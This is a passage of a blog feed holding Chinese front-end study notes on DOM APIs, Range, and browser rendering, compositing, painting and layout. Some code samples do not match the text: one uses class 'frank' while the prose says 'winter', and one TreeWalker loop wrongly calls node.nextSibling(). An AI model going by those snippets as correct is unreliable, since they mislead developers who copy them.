class="language-xml">DocumentType: <span class="meta">&lt;!Doctype <span class="keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">ProcessingInstruction: </span><span class="language-php"><span class="meta">&lt;?</span>a <span class="number">1</span><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>我们在编写 HTML 代码并且运行后，就会在内存中得到这样一棵 DOM 树，HTML 的写法会被转化成对应的文档模型，而我们则可以通过 JavaScript 等语言去访问这个文档模型。</p><p>这里我们每天都需要用到，要重点掌握的是：Document、Element、Text 节点。</p><p>DocumentFragment 也非常有用，它常常被用来高性能地批量添加节点。因为 Comment、DocumentType 和 ProcessingInstruction 很少需要运行时去修改和操作，所以有所了解即可。</p><h2 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h2><p>Node 是 DOM 树继承关系的根节点，它定义了 DOM 节点在 DOM 树上的操作，首先，Node 提供了一组属性，来表示它在 DOM 树中的关系，它们是：</p><ul><li>parentNode</li><li>childNodes</li><li>firstChild</li><li>lastChild</li><li>nextSibling</li><li>previousSibling</li></ul><p>从命名上，我们可以很清晰地看出，这一组属性提供了前、后、父、子关系，有了这几个属性，我们可以很方便地根据相对位置获取元素。当然，Node 中也提供了操作 DOM 树的 API，主要有下面几种。</p><ul><li>appendChild</li><li>insertBefore</li><li>removeChild</li><li>replaceChild</li></ul><p>这个命名跟上面一样，我们基本可以知道 API 的作用。这几个 API 的设计可以说是饱受诟病。其中最主要的批评是它不对称——只有 before，没有 after，而 jQuery 等框架都对其做了补充。</p><p>实际上，appendChild 和 insertBefore 的这个设计，是一个“最小原则”的设计，这两个 API 是满足插入任意位置的必要 API，而 insertAfter，则可以由这两个 API 实现出来。</p><p>我个人其实不太喜欢这个设计，对我而言，insertAt(pos) 更符合审美一些。当然，不论喜不喜欢，这个标准已经确定，我们还是必须要掌握它。</p><p>这里从设计的角度还想要谈一点，那就是，所有这几个修改型的 API，全都是在父元素上操作的，比如我们要想实现“删除一个元素的上一个元素”，必须要先用 parentNode 获取其父元素。</p><p>这样的设计是符合面向对象的基本原则的。还记得我们在 JavaScript 对象部分讲的对象基本特征吗？“拥有哪些子元素”是父元素的一种状态，所以修改状态，应该是父元素的行为。这个设计我认为是 DOM API 中好的部分。</p><p>到此为止，Node 提供的 API 已经可以很方便（大概吧）地对树进行增、删、遍历等操作了。</p><p>除此之外，Node 还提供了一些高级 API，我们来认识一下它们。</p><ul><li>compareDocumentPosition 是一个用于比较两个节点中关系的函数。</li><li>contains 检查一个节点是否包含另一个节点的函数。</li><li>isEqualNode 检查两个节点是否完全相同。</li><li>isSameNode 检查两个节点是否是同一个节点，实际上在 JavaScript 中可以用“&#x3D;&#x3D;&#x3D;”。</li><li>cloneNode 复制一个节点，如果传入参数 true，则会连同子元素做深拷贝。</li></ul><p>DOM 标准规定了节点必须从文档的 create 方法创建出来，不能够使用原生的 JavaScript 的 new 运算。于是 document 对象有这些方法。</p><ul><li>createElement</li><li>createTextNode</li><li>createCDATASection</li><li>createComment</li><li>createProcessingInstruction</li><li>createDocumentFragment</li><li>createDocumentType</li></ul><p>上面的这些方法都是用于创建对应的节点类型。你可以自己尝试一下。</p><h2 id="Element-与-Attribute"><a href="#Element-与-Attribute" class="headerlink" title="Element 与 Attribute"></a>Element 与 Attribute</h2><p>Node 提供了树形结构上节点相关的操作。而大部分时候，我们比较关注的是元素。Element 表示元素，它是 Node 的子类。</p><p>元素对应了 HTML 中的标签，它既有子节点，又有属性。所以 Element 子类中，有一系列操作属性的方法。</p><p>我们需要注意，对 DOM 而言，Attribute 和 Property 是完全不同的含义，只有特性场景下，两者才会互相关联（这里在后面我会详细讲解，今天的文章里我就不展开了）。</p><p>首先，我们可以把元素的 Attribute 当作字符串来看待，这样就有以下的 API：</p><ul><li>getAttribute</li><li>setAttribute</li><li>removeAttribute</li><li>hasAttribute</li></ul><p>如果你追求极致的性能，还可以把 Attribute 当作节点：</p><ul><li>getAttributeNode</li><li>setAttributeNode</li></ul><p>此外，如果你喜欢 property 一样的访问 attribute，还可以使用 attributes 对象，比如 document.body.attributes.class &#x3D; “a” 等效于 document.body.setAttribute(“class”, “a”)。</p><h2 id="查找元素"><a href="#查找元素" class="headerlink" title="查找元素"></a>查找元素</h2><p>document 节点提供了查找元素的能力。比如有下面的几种。</p><ul><li>querySelector</li><li>querySelectorAll</li><li>getElementById</li><li>getElementsByName</li><li>getElementsByTagName</li><li>getElementsByClassName</li></ul><p>我们需要注意，getElementById、getElementsByName、getElementsByTagName、getElementsByClassName，这几个 API 的性能高于 querySelector。</p><p>而 getElementsByName、getElementsByTagName、getElementsByClassName 获取的集合并非数组，而是一个能够动态更新的集合。</p><p>我们看一个例子：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> collection = document.getElementsByClassName(<span class="string">&#x27;frank&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(collection.<span class="built_in">length</span>);</span><br><span class="line"><span class="keyword">var</span> winter = document.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">winter.setAttribute(<span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;frank&#x27;</span>)</span><br><span class="line">document.documentElement.appendChild(winter)</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(collection.<span class="built_in">length</span>);</span><br></pre></td></tr></table></figure><p>在这段代码中，我们先获取了页面的 className 为 winter 的元素集合，不出意外的话，应该是空。</p><p>我们通过 console.log 可以看到集合的大小为 0。之后我们添加了一个 class 为 winter 的 div，这时候我们再看集合，可以发现，集合中出现了新添加的元素。</p><p>这说明浏览器内部是有高速的索引机制，来动态更新这样的集合的。所以，尽管 querySelector 系列的 API 非常强大，我们还是应该尽量使用 getElement 系列的 API。</p><h2 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h2><p>前面已经提到过，通过 Node 的相关属性，我们可以用 JavaScript 遍历整个树。实际上，DOM API 中还提供了 NodeIterator 和 TreeWalker 来遍历树。</p><p>比起直接用属性来遍历，NodeIterator 和 TreeWalker 提供了过滤功能，还可以把属性节点也包含在遍历之内。</p><p>NodeIterator 的基本用法示例如下：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var iterator = document.createNodeIterator(document.body, NodeFilter.SHOW_TEXT | NodeFilter.SHOW_COMMENT, null, <span class="literal">false</span>);</span><br><span class="line">var <span class="keyword">node</span><span class="title">;</span></span><br><span class="line"><span class="title">while</span>(<span class="keyword">node</span> <span class="title">= iterator</span>.nextNode())</span><br><span class="line">&#123;</span><br><span class="line">    console.log(<span class="keyword">node</span><span class="title">);</span></span><br><span class="line"><span class="title">&#125;</span></span><br></pre></td></tr></table></figure><p>这个 API 的设计非常老派，这么讲的原因主要有两点，一是循环并没有类似“hasNext”这样的方法，而是直接以 nextNode 返回 null 来标志结束，二是第二个参数是掩码，这两个设计都是传统 C 语言里比较常见的用法。</p><p>放到今天看，这个迭代器无法匹配 JavaScript 的迭代器语法，而且 JavaScript 位运算并不高效，掩码的设计就徒增复杂性了。</p><p>这里请你注意一下这个例子中的处理方法，通常掩码型参数，我们都是用按位或运算来叠加。而针对这种返回 null 表示结束的迭代器，我使用了在 while 循环条件中赋值，来保证循环次数和调用 next 次数严格一致（但这样写可能违反了某些编码规范）。</p><p>我们再来看一下 TreeWalker 的用法。</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_ELEMENT, null, <span class="literal">false</span>)</span><br><span class="line">var <span class="keyword">node</span><span class="title">;</span></span><br><span class="line"><span class="title">while</span>(<span class="keyword">node</span> <span class="title">= walker</span>.nextNode())</span><br><span class="line">&#123;</span><br><span class="line">    if(node.tagName === <span class="string">&quot;p&quot;</span>)</span><br><span class="line">        node.nextSibling();</span><br><span class="line">    console.log(<span class="keyword">node</span><span class="title">);</span></span><br><span class="line"><span class="title">&#125;</span></span><br></pre></td></tr></table></figure><p>比起 NodeIterator，TreeWalker 多了在 DOM 树上自由移动当前节点的能力，一般来说，这种 API 用于“跳过”某些节点，或者重复遍历某些节点。</p><p>总的来说，我个人不太喜欢 TreeWalker 和 NodeIterator 这两个 API，建议需要遍历 DOM 的时候，直接使用递归和 Node 的属性。</p><h2 id="Range"><a href="#Range" class="headerlink" title="Range"></a>Range</h2><p>Range API 是一个比较专业的领域，如果不做富文本编辑类的业务，不需要太深入。这里我们就仅介绍概念和给出基本用法的示例，你只要掌握即可。</p><p>Range API 表示一个 HTML 上的范围，这个范围是以文字为最小单位的，所以 Range 不一定包含完整的节点，它可能是 Text 节点中的一段，也可以是头尾两个 Text 的一部分加上中间的元素。</p><p>我们通过 Range API 可以比节点 API 更精确地操作 DOM 树，凡是 节点 API 能做到的，Range API 都可以做到，而且可以做到更高性能，但是 Range API 使用起来比较麻烦，所以在实际项目中，并不常用，只有做底层框架和富文本编辑对它有强需求。</p><p>创建 Range 一般是通过设置它的起止来实现，我们可以看一个例子：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var</span> range = new <span class="built_in">Range</span>(),</span><br><span class="line">    firstText = <span class="selector-tag">p</span><span class="selector-class">.childNodes</span><span class="selector-attr">[1]</span>,</span><br><span class="line">    secondText = <span class="selector-tag">em</span><span class="selector-class">.firstChild</span></span><br><span class="line">range<span class="selector-class">.setStart</span>(firstText, <span class="number">9</span>) <span class="comment">// do not forget the leading space</span></span><br><span class="line">range<span class="selector-class">.setEnd</span>(secondText, <span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>此外，通过 Range 也可以从用户选中区域创建，这样的 Range 用于处理用户选中区域:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var range <span class="operator">=</span> document.getSelection().getRangeAt(<span class="number">0</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>更改 Range 选中区段内容的方式主要是取出和插入，分别由 extractContents 和 insertNode 来实现。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var fragment = range.extract<span class="constructor">Contents()</span></span><br><span class="line">range.insert<span class="constructor">Node(<span class="params">document</span>.<span class="params">createTextNode</span>(<span class="string">&quot;aaaa&quot;</span>)</span>)</span><br></pre></td></tr></table></figure><p>最后我们看一个完整的例子。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var</span> range = new <span class="built_in">Range</span>(),</span><br><span class="line">    firstText = <span class="selector-tag">p</span><span class="selector-class">.childNodes</span><span class="selector-attr">[1]</span>,</span><br><span class="line">    secondText = <span class="selector-tag">em</span><span class="selector-class">.firstChild</span></span><br><span class="line">range<span class="selector-class">.setStart</span>(firstText, <span class="number">9</span>) <span class="comment">// do not forget the leading space</span></span><br><span class="line">range<span class="selector-class">.setEnd</span>(secondText, <span class="number">4</span>)</span><br><span class="line"><span class="selector-tag">var</span> fragment = range<span class="selector-class">.extractContents</span>()</span><br><span class="line">range<span class="selector-class">.insertNode</span>(document<span class="selector-class">.createTextNode</span>(<span class="string">&quot;aaaa&quot;</span>))</span><br></pre></td></tr></table></figure><p>这个例子展示了如何使用 range 来取出元素和在特定位置添加新元素。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>30丨浏览器：一个浏览器是如何工作的5</title>
      <link href="/Blog/2019/01/30/relearn_FE/30%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%845/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/30%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%845/index/</url>
      
        <content type="html"><![CDATA[<p>在之前的几篇文章中，我们已经经历了把 URL 变成字符流，把字符流变成词（token）流，把词（token）流构造成 DOM 树，把不含样式信息的 DOM 树应用 CSS 规则，变成包含样式信息的 DOM 树，并且根据样式信息，计算了每个元素的位置和大小。</p><p>那么，我们最后的步骤，就是根据这些样式信息和大小信息，为每个元素在内存中渲染它的图形，并且把它绘制到对应的位置。</p><h2 id="渲染"><a href="#渲染" class="headerlink" title="渲染"></a>渲染</h2><p>首先我们来谈谈渲染这个词，渲染也是个外来词，它是英文词 render 的翻译，render 这个词在英文里面，有“导致”“变成”的意思，也有“粉刷墙壁”的意思。</p><p>在计算机图形学领域里，英文 render 这个词是一个简写，它是特指把模型变成位图的过程。我们把 render 翻译成“渲染”，是个非常有意思的翻译，中文里“渲染”这个词是一种绘画技法，是指沾清水把墨涂开的意思。</p><p>所以，render 翻译成“渲染”，我认为是非常高明的，对 render 这个过程，用国画的渲染手法来概括，是颇有神似的。</p><p>我们现在的一些框架，也会把“从数据变成 HTML 代码的过程”称为 render，其实我觉得这是非常具有误导性的，我个人是非常不喜欢这种命名方式，当然了，所谓“文无第一”，在自然语言的范围里，我们很难彻底否定这种用法的合理性。</p><p>不过，在本篇文章中，我们可以约定一下，本文中出现的“渲染”一词，统一指的是它在图形学的意义，也就是把模型变成位图的过程。</p><p>这里的位图就是在内存里建立一张二维表格，把一张图片的每个像素对应的颜色保存进去（位图信息也是 DOM 树中占据浏览器内存最多的信息，我们在做内存占用优化时，主要就是考虑这一部分）。</p><p>浏览器中渲染这个过程，就是把每一个元素对应的盒变成位图。这里的元素包括 HTML 元素和伪元素，一个元素可能对应多个盒（比如 inline 元素，可能会分成多行）。每一个盒对应着一张位图。</p><p>这个渲染过程是非常复杂的，但是总体来说，可以分成两个大类：图形和文字。</p><p>盒的背景、边框、SVG 元素、阴影等特性，都是需要绘制的图形类。这就像我们实现 HTTP 协议必须要基于 TCP 库一样，这一部分，我们需要一个底层库来支持。</p><p>一般的操作系统会提供一个底层库，比如在 Android 中，有大名鼎鼎的 Skia，而 Windows 平台则有 GDI，一般的浏览器会做一个兼容层来处理掉平台差异。</p><p>这些盒的特性如何绘制，每一个都有对应的标准规定，而每一个的实现都可以作为一个独立的课题来研究，当年圆角 + 虚线边框，可是难倒了各个浏览器的工程师。考虑到这些知识互相都比较独立，对前端工程师来说也不是特别重要的细节，我们这里就不详细探究了。</p><p>盒中的文字，也需要用底层库来支持，叫做字体库。字体库提供读取字体文件的基本能力，它能根据字符的码点抽取出字形。</p><p>字形分为像素字形和矢量字形两种。通常的字体，会在 6px 8px 等小尺寸提供像素字形，比较大的尺寸则提供矢量字形。矢量字形本身就需要经过渲染才能继续渲染到元素的位图上去。目前最常用的字体库是 Freetype，这是一个 C++ 编写的开源的字体库。</p><p>在最普遍的情况下，渲染过程生成的位图尺寸跟它在上一步排版时占据的尺寸相同。</p><p>但是理想和现实是有差距的，很多属性会影响渲染位图的大小，比如阴影，它可能非常巨大，或者渲染到非常遥远的位置，所以为了优化，浏览器实际的实现中会把阴影作为一个独立的盒来处理。</p><p>注意，我们这里讲的渲染过程，是不会把子元素绘制到渲染的位图上的，这样，当父子元素的相对位置发生变化时，可以保证渲染的结果能够最大程度被缓存，减少重新渲染。</p><h2 id="合成"><a href="#合成" class="headerlink" title="合成"></a>合成</h2><p>合成是英文术语 compositing 的翻译，这个过程实际上是一个性能考量，它并非实现浏览器的必要一环。</p><p>我们上一小节中讲到，渲染过程不会把子元素渲染到位图上面，合成的过程，就是为一些元素创建一个“合成后的位图”（我们把它称为合成层），把一部分子元素渲染到合成的位图上面。</p><p>看到这句话，我想你一定会问问题，到底是为哪些元素创建合成后的位图，把哪些子元素渲染到合成的位图上面呢？</p><p>这就是我们要讲的合成的策略。我们前面讲了，合成是一个性能考量，那么合成的目标就是提高性能，根据这个目标，我们建立的原则就是最大限度减少绘制次数原则。</p><p>我们举一个极端的例子。如果我们把所有元素都进行合成，比如我们为根元素 HTML 创建一个合成后的位图，把所有子元素都进行合成，那么会发生什么呢？</p><p>那就是，一旦我们用 JavaScript 或者别的什么方式，改变了任何一个 CSS 属性，这份合成后的位图就失效了，我们需要重新绘制所有的元素。</p><p>那么如果我们所有的元素都不合成，会怎样呢？结果就是，相当于每次我们都必须要重新绘制所有的元素，这也不是对性能友好的选择。</p><p>那么好的合成策略是什么呢，好的合成策略是“猜测”可能变化的元素，把它排除到合成之外。</p><p>我们来举个例子：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">id</span>=<span class="string">&quot;a&quot;</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">id</span>=<span class="string">&quot;b&quot;</span>&gt;...&lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">div</span> <span class="built_in">id</span>=<span class="string">&quot;c&quot;</span> style=<span class="string">&quot;transform:translate(0,0)&quot;</span>&gt;&lt;/<span class="keyword">div</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></table></figure><p>假设我们的合成策略能够把 a、b 两个 div 合成，而不把 c 合成，那么，当我执行以下代码时：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(<span class="string">&quot;c&quot;</span>).style.transform <span class="operator">=</span> <span class="string">&quot;translate(100px, 0)&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><p>我们绘制的时候，就可以只需要绘制 a 和 b 合成好的位图和 c，从而减少了绘制次数。这里需要注意的是，在实际场景中，我们的 b 可能有很多复杂的子元素，所以当合成命中时，性能提升收益非常之高。</p><p>目前，主流浏览器一般根据 position、transform 等属性来决定合成策略，来“猜测”这些元素未来可能发生变化。</p><p>但是，这样的猜测准确性有限，所以新的 CSS 标准中，规定了 will-change 属性，可以由业务代码来提示浏览器的合成策略，灵活运用这样的特性，可以大大提升合成策略的效果。</p><h2 id="绘制"><a href="#绘制" class="headerlink" title="绘制"></a>绘制</h2><p>绘制是把“位图最终绘制到屏幕上，变成肉眼可见的图像”的过程，不过，一般来说，浏览器并不需要用代码来处理这个过程，浏览器只需要把最终要显示的位图交给操作系统即可。</p><p>一般最终位图位于显存中，也有一些情况下，浏览器只需要把内存中的一张位图提交给操作系统或者驱动就可以了，这取决于浏览器运行的环境。不过无论如何，我们把任何位图合成到这个“最终位图”的操作称为绘制。</p><p>这个过程听上去非常简单，这是因为在前面两个小节中，我们已经得到了每个元素的位图，并且对它们部分进行了合成，那么绘制过程，实际上就是按照 z-index 把它们依次绘制到屏幕上。</p><p>然而如果在实际中这样做，会带来极其糟糕的性能。</p><p>有一个一度非常流行于前端群体的说法，讲做 CSS 性能优化，应该尽量避免“重排”和“重绘”，前者讲的是我们上一课的排版行为，后者模糊地指向了我们本课程三小节讲的三个步骤，而实际上，这个说法大体不能算错，却不够准确。</p><p>因为，实际上，“绘制”发生的频率比我们想象中要高得多。我们考虑一个情况：鼠标划过浏览器显示区域。这个过程中，鼠标的每次移动，都造成了重新绘制，如果我们不重新绘制，就会产生大量的鼠标残影。</p><p>这个时候，限制绘制的面积就很重要了。如果鼠标某次位置恰巧遮盖了某个较小的元素，我们完全可以重新绘制这个元素来完成我们的目标，当然，简单想想就知道，这种事情不可能总是发生的。</p><p>计算机图形学中，我们使用的方案就是“脏矩形”算法，也就是把屏幕均匀地分成若干矩形区域。</p><p>当鼠标移动、元素移动或者其它导致需要重绘的场景发生时，我们只重新绘制它所影响到的几个矩形区域就够了。比矩形区域更小的影响最多只会涉及 4 个矩形，大型元素则覆盖多个矩形。</p><p>设置合适的矩形区域大小，可以很好地控制绘制时的消耗。设置过大的矩形会造成绘制面积增大，而设置过小的矩形则会造成计算复杂。</p><p>我们重新绘制脏矩形区域时，把所有与矩形区域有交集的合成层（位图）的交集部分绘制即可。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>29丨浏览器：一个浏览器是如何工作的4</title>
      <link href="/Blog/2019/01/30/relearn_FE/29%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%844/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/29%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%844/index/</url>
      
        <content type="html"><![CDATA[<p>我们书接上文。浏览器进行到这一步，我们已经给 DOM 元素添加了用于展现的 CSS 属性，接下来，浏览器的工作就是确定每一个元素的位置了。我们的基本原则仍然不变，就是尽可能流式地处理上一步骤的输出。</p><p>在构建 DOM 树和计算 CSS 属性这两个步骤，我们的产出都是一个一个的元素，但是在排版这个步骤中，有些情况下，我们就没法做到这样了。</p><p>尤其是表格相关排版、Flex 排版和 Grid 排版，它们有一个显著的特点，那就是子元素之间具有关联性。</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>首先我们先来介绍一些基本概念，使你可以感性地认识一下我们平常说的各种术语。</p><p><strong>“排版”</strong>这个概念最初来自活字印刷，是指我们把一个一个的铅字根据文章顺序，放入板框当中的步骤，排版的意思是确定每一个字的位置。</p><p>在现代浏览器中，仍然借用了这个概念，但是排版的内容更加复杂，包括文字、图片、图形、表格等等，我们把浏览器确定它们位置的过程，叫作排版。</p><p>浏览器最基本的排版方案是<strong>正常流排版</strong>，它包含了顺次排布和折行等规则，这是一个跟我们提到的印刷排版类似的排版方案，也跟我们平时书写文字的方式一致，所以我们把它叫做正常流。</p><p>浏览器的文字排版遵循公认的文字排版规范，文字排版是一个复杂的系统，它规定了行模型和文字在行模型中的排布。行模型规定了行顶、行底、文字区域、基线等对齐方式。（你还记得小时候写英语的英语本吗？英语本上的四条线就是一个简单的行模型。）</p><p>此外，浏览器支持不同语言，因为不同语言的书写顺序不一致，所以浏览器的文本排版还支持双向文字系统。</p><p>浏览器又可以支持元素和文字的混排，元素被定义为占据长方形的区域，还允许边框、边距和留白，这个就是所谓的<strong>盒模型</strong>。</p><p>在正常流的基础上，浏览器还支持两类元素：绝对定位元素和浮动元素。</p><ul><li>绝对定位元素把自身从正常流抽出，直接由 top 和 left 等属性确定自身的位置，不参加排版计算，也不影响其它元素。</li><li>绝对定位元素由 position 属性控制。浮动元素则是使得自己在正常流的位置向左或者向右移动到边界，并且占据一块排版空间。浮动元素由 float 属性控制。</li></ul><p>除了正常流，浏览器还支持其它排版方式，比如现在非常常用的 Flex 排版，这些排版方式由外部元素的 display 属性来控制（注意，display 同时还控制元素在正常流中属于 inline 等级还是 block 等级）。</p><h2 id="正常流文字排版"><a href="#正常流文字排版" class="headerlink" title="正常流文字排版"></a>正常流文字排版</h2><p>我们会在 CSS 部分详细介绍正常流排版的行为，我们这里主要介绍浏览器中的正常流。正常流是唯一一个文字和盒混排的排版方式，我们先从文字来讲起。</p><p>要想理解正常流，我们首先要回忆一下自己如何在纸上写文章。</p><p>首先，纸是有固定宽度的，虽然纸有固定高度，但是我们可以通过下一页纸的方式来接续，因此我们不存在写不下的场景。</p><p>我们书写文字的时候，是从左到右依次书写，每一个字跟上一个字都不重叠，文字之间有一定间距，当写满一行时，我们换到下一行去继续写。</p><p>书写中文时，文字的上、下、中轴线都对齐，书写英文时，不同字母的高度不同，但是有一条基线对齐。</p><p>实际上浏览器环境也很类似。但是因为浏览器支持改变排版方向，不一定是从左到右从上到下，所以我们把文字依次书写的延伸方向称为主轴或者主方向，换行延伸的方向，跟主轴垂直交叉，称为交叉轴或者交叉方向。</p><p>我们一般会从某个字体文件中获取某个特定文字的相关信息。我们获取到的信息大概类似下面：</p><p><img src="/Blog/2019/01/30/relearn_FE/29%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%844/index/img.png"></p><p>纵向版本：</p><p><img src="/Blog/2019/01/30/relearn_FE/29%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%844/index/img_1.png"></p><p>这两张图片来自著名开源字体解析库 freetype，实际上，各个库对字体的理解大同小异，我们注意一下，advance 代表每一个文字排布后在主轴上的前进距离，它跟文字的宽 &#x2F; 高不相等，是字体中最重要的属性。</p><p>除了字体提供的字形本身包含的信息，文字排版还受到一些 CSS 属性影响，如 line-height、letter-spacing、word-spacing 等。</p><p>在正常流的文字排版中，多数元素被当作长方形盒来排版，而只有 display 为 inline 的元素，是被拆成文本来排版的（还有一种 run-in 元素，它有时作为盒，有时作为文字，不太常用，这里不详细讲了）。</p><blockquote><p>css中的盒模型并不是所有元素都应用的。对于大多数元素，都使用了盒模型进行排版，所以我们可以设置盒模型的margin、padding等属性。 这里提到了对于 display: inline 的元素是被拆成文本来排版的。</p></blockquote><p>display 值为 inline 的元素中的文字排版时会被直接排入文字流中，inline 元素主轴方向的 margin 属性和 border 属性（例如主轴为横向时的 margin-left 和 margin-right）也会被计算进排版前进距离当中。</p><p>注意，当没有强制指定文字书写方向时，在左到右文字中插入右到左向文字，会形成一个双向文字盒，反之亦然。</p><p>这样，即使没有元素包裹，混合书写方向的文字也可以形成一个盒结构，我们在排版时，遇到这样的双向文字盒，会先排完盒内再排盒外。</p><h2 id="正常流中的盒"><a href="#正常流中的盒" class="headerlink" title="正常流中的盒"></a>正常流中的盒</h2><p>在正常流中，display 不为 inline 的元素或者伪元素，会以盒的形式跟文字一起排版。多数 display 属性都可以分成两部分：内部的排版和是否 inline，带有 inline- 前缀的盒，被称作行内级盒。</p><p>根据盒模型，一个盒具有 margin、border、padding、width&#x2F;height 等属性，它在主轴方向占据的空间是由对应方向的这几个属性之和决定的，而 vertical-align 属性决定了盒在交叉轴方向的位置，同时也会影响实际行高。</p><p>所以，浏览器对行的排版，一般是先行内布局，再确定行的位置，根据行的位置计算出行内盒和文字的排版位置。</p><p>块级盒比较简单，它总是单独占据一整行，计算出交叉轴方向的高度即可。</p><h2 id="绝对定位元素"><a href="#绝对定位元素" class="headerlink" title="绝对定位元素"></a>绝对定位元素</h2><p>position 属性为 absolute 的元素，我们需要根据它的包含块来确定位置，这是完全跟正常流无关的一种独立排版模式，逐层找到其父级的 position 非 static 元素即可。</p><h2 id="浮动元素排版"><a href="#浮动元素排版" class="headerlink" title="浮动元素排版"></a>浮动元素排版</h2><p>float 元素非常特别，浏览器对 float 的处理是先排入正常流，再移动到排版宽度的最左 &#x2F; 最右（这里实际上是主轴的最前和最后）。</p><p>移动之后，float 元素占据了一块排版的空间，因此，在数行之内，主轴方向的排版距离发生了变化，直到交叉轴方向的尺寸超过了浮动元素的交叉轴尺寸范围，主轴排版尺寸才会恢复。float 元素排布完成后，float 元素所在的行需要重新确定位置。</p><h2 id="其它的排版"><a href="#其它的排版" class="headerlink" title="其它的排版"></a>其它的排版</h2><p>CSS 的每一种排版都有一个很复杂的规定，实际实现形式也各不相同。比如如 Flex 排版，支持了 flex 属性，flex 属性将每一行排版后的剩余空间平均分配给主轴方向的 width&#x2F;height 属性。浏览器支持的每一种排版方式，都是按照对应的标准来实现的。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>28丨浏览器：一个浏览器是如何工作的3</title>
      <link href="/Blog/2019/01/30/relearn_FE/28%E4%B8%A8%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C%E7%9A%843/index/"/>
